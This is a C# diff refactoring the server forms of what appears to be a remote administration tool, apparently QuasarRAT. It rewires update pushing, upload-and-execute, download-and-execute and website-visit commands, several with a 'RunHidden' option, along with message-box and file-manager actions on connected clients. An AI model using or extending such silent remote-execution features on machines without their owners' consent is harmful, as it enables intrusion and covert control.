@@ -439,14 +439,16 @@ namespace xServer.Forms
                 {
                     if (frm.ShowDialog() == DialogResult.OK)
                     {
-                        if (Core.Data.Update.UseDownload)
+                        if (!frm.UseDownload && !File.Exists(frm.UploadPath)) return;
+
+                        if (frm.UseDownload)
                         {
                             foreach (Client c in GetSelectedClients())
                             {
                                 c.Send(new DoClientUpdate
                                 {
                                     Id = 0,
-                                    DownloadUrl = Core.Data.Update.DownloadURL,
+                                    DownloadUrl = frm.DownloadUrl,
                                     FileName = string.Empty,
                                     Block = new byte[0x00],
                                     MaxBlocks = 0,
@@ -456,6 +458,8 @@ namespace xServer.Forms
                         }
                         else
                         {
+                            string path = frm.UploadPath;
+
                             new Thread(() =>
                             {
                                 bool error = false;
@@ -464,7 +468,7 @@ namespace xServer.Forms
                                     if (c == null) continue;
                                     if (error) continue;
 
-                                    FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
+                                    FileSplit srcFile = new FileSplit(path);
                                     if (srcFile.MaxBlocks < 0)
                                     {
                                         MessageBox.Show($"Error reading file: {srcFile.LastError}",
@@ -562,13 +566,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmFm != null)
-                {
-                    c.Value.FrmFm.Focus();
-                    return;
-                }
-                FrmFileManager frmFM = new FrmFileManager(c);
+                FrmFileManager frmFM = FrmFileManager.CreateNewOrGetExisting(c);
                 frmFM.Show();
+                frmFM.Focus();
             }
         }
 
@@ -759,8 +759,11 @@ namespace xServer.Forms
             {
                 using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                 {
-                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
+                    if (frm.ShowDialog() == DialogResult.OK && File.Exists(frm.LocalFilePath))
                     {
+                        string path = frm.LocalFilePath;
+                        bool hidden = frm.Hidden;
+
                         new Thread(() =>
                         {
                             bool error = false;
@@ -769,7 +772,7 @@ namespace xServer.Forms
                                 if (c == null) continue;
                                 if (error) continue;
 
-                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
+                                FileSplit srcFile = new FileSplit(path);
                                 if (srcFile.MaxBlocks < 0)
                                 {
                                     MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
@@ -791,11 +794,11 @@ namespace xServer.Forms
                                         c.SendBlocking(new DoUploadAndExecute
                                         {
                                             Id = id,
-                                            FileName = Path.GetFileName(UploadAndExecute.FilePath),
+                                            FileName = Path.GetFileName(path),
                                             Block = block,
                                             MaxBlocks = srcFile.MaxBlocks,
                                             CurrentBlock = currentBlock,
-                                            RunHidden = UploadAndExecute.RunHidden
+                                            RunHidden = hidden
                                         });
                                     }
                                     else
@@ -825,8 +828,8 @@ namespace xServer.Forms
                         {
                             c.Send(new DoDownloadAndExecute
                             {
-                                Url = DownloadAndExecute.URL,
-                                RunHidden = DownloadAndExecute.RunHidden
+                                Url = frm.Url,
+                                RunHidden = frm.Hidden
                             });
                         }
                     }
@@ -846,8 +849,8 @@ namespace xServer.Forms
                         {
                             c.Send(new DoVisitWebsite
                             {
-                                Url = VisitWebsite.URL,
-                                Hidden = VisitWebsite.Hidden
+                                Url = frm.Url,
+                                Hidden = frm.Hidden
                             });
                         }
                     }
@@ -867,10 +870,10 @@ namespace xServer.Forms
                         {
                             c.Send(new DoShowMessageBox
                             {
-                                Caption = Messagebox.Caption,
-                                Text = Messagebox.Text,
-                                Button = Messagebox.Button,
-                                Icon = Messagebox.Icon
+                                Caption = frm.MsgBoxCaption,
+                                Text = frm.MsgBoxText,
+                                Button = frm.MsgBoxButton,
+                                Icon = frm.MsgBoxIcon
                             });
                         }
                     }
